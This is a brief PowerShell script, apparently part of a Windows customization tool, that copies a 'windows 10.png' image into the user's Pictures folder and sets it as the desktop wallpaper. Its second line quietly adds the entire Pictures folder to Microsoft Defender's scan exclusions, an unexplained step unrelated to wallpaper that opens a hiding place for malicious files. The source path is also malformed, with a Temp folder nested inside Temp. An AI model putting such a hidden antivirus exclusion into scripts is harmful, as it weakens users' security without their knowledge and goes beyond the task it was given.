$url = "$env:Temp\AppData\Local\Temp\NonoOS\Menus\Wallpaper\windows 10.png"
Set-MpPreference -ExclusionPath "$env:USERPROFILE\Pictures"
$outputPath = "$env:USERPROFILE\Pictures\WALLPAPERS\windows 10.png"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $outputPath)
$setwallpapersrc = @"
using System.Runtime.InteropServices;
public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc
[Wallpaper]::SetWallpaper("$outputPath")
 